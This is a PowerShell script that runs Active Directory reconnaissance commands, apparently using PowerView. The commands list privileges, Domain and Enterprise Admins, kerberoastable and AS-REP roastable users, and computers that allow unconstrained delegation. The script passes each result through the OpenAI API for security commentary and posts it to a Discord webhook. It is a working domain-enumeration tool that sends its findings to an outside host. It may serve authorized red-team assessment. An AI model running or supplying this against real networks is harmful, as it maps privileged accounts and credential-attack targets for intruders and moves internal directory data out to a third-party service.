# Define OpenAI API and Discord Webhook details
$ApiKey = "<ENTER KEY>"
$ApiEndpoint = "https://api.openai.com/v1/chat/completions"
$discordWebhookUrl = "<ENTER KEY>"
$domain = "domain.local"
$domainController = "<ENTER IP>"

$AiSystemMessage = "Present the data exactly as your receieve it, but format to be readable with a header seperating each command. Add commentary at the end to highlight areas of concern from a security perspective"

function Invoke-ChatGPT ($message) {
    [System.Collections.Generic.List[Hashtable]]$messages = @()
    $messages.Add(@{"role" = "system"; "content" = $AiSystemMessage}) | Out-Null
    $messages.Add(@{"role"="user"; "content"=$message})

    $headers = @{
        "Content-Type" = "application/json"
        "Authorization" = "Bearer $ApiKey"
    }   

    $requestBody = @{
        "model" = "gpt-4"
        "messages" = $messages
        "max_tokens" = 2000
        "temperature" = 1
    }

    $response = Invoke-RestMethod -Method POST -Uri $ApiEndpoint -Headers $headers -Body (ConvertTo-Json $requestBody)
    return $response.choices[0].message.content
}

function SendToDiscord ($messageContent) {
    # Split the message content into chunks of 2000 characters or less
    $chunkSize = 2000
    $chunks = [Math]::Ceiling($messageContent.Length / $chunkSize)

    0..($chunks - 1) | ForEach-Object {
        $start = $_ * $chunkSize
        $messageChunk = $messageContent.Substring($start, [Math]::Min($chunkSize, $messageContent.Length - $start))
        
        $discordBody = @{
            "content" = $messageChunk
        } | ConvertTo-Json

        Invoke-RestMethod -Uri $discordWebhookUrl -Method Post -Body $discordBody -Headers @{ "Content-Type" = "application/json" }
    }
}

function ProcessAndSendCommand($command, $commandNumber) {
    try {
        $output = Invoke-Expression -Command $command | Out-String
        $formattedOutput = "Command $commandNumber (`"$command`"): `n$output"

        Write-Host $formattedOutput  # This will print the output to the console for debugging.

        $AiResponse = Invoke-ChatGPT $formattedOutput
        SendToDiscord $AiResponse
    }
    catch {
        Write-Host "Error executing command ${commandNumber}: $_" -ForegroundColor Red

    }
}


# Commands with embedded comments
$commands = @(
    "Fetching User privilleges. | whoami /priv | Out-String",
	"Fetching domain policies.|Get-DomainPolicy -Domain $domain -DomainController $domainController | Out-String",
    "Getting domain controllers.|Get-DomainController -Domain $domain -DomainController $domainController | Out-String",
    "Listing 'Domain Admins' members.|Get-DomainGroupMember -Identity 'Domain Admins' -Domain $domain -DomainController $domainController | Select-Object MemberDistinguishedName | Out-String",
    "Listing 'Enterprise Admins' members.|Get-DomainGroupMember -Identity 'Enterprise Admins' -Domain $domain -DomainController $domainController | Select-Object MemberDistinguishedName | Out-String",
	"Listing 'Remote Desktop Users' members.|Get-DomainGroupMember -Identity 'Remote Desktop Users' -Domain $domain -DomainController $domainController | Select-Object MemberDistinguishedName | Out-String",
    "Fetching kerberoastable users with Service Principal Names.|Get-NetUser -SPN -Domain $domain -DomainController $domainController | Select-Object -First 10 sn,pwdlastset | Out-String",
	"Fetching ASREP roastable users.|Get-NetUser -PreAuthNotRequired -Domain $domain -DomainController $domainController | Select-Object -First 10 sn,pwdlastset | Out-String",
    "Fetching Domain Computers.|Get-DomainComputer -Properties OperatingSystem, Name, DnsHostName -Domain $domain -DomainController $domainController | Select-Object -First 1 | Out-String",
	"Fetching Computers which allow unconstrained delegation.|Get-NetComputer -Unconstrained -Domain $domain -DomainController $domainController | Out-String"
	
)

# Process and send each command one-by-one
foreach ($commandWithComment in $commands) {
    # Split the command and its comment
    $split = $commandWithComment -split '\|', 2
    $comment = $split[0]
    $command = $split[1]

    # Debug: Print the command that's being executed
    Write-Host "Executing: $comment" -ForegroundColor Yellow

    try {
        $commandOutput = Invoke-Expression -Command $command
        # Combine the comment with the command's output
        $messageToSend = "$comment`n$commandOutput"
        # Call ChatGPT and send to Discord
        $AiResponse = Invoke-ChatGPT $messageToSend
        SendToDiscord $AiResponse
        Start-Sleep -Seconds 10  # Introduce a 10-second delay
    } catch {
        Write-Host "Error executing command: $comment`n$($_.Exception.Message)" -ForegroundColor Red
    }
}
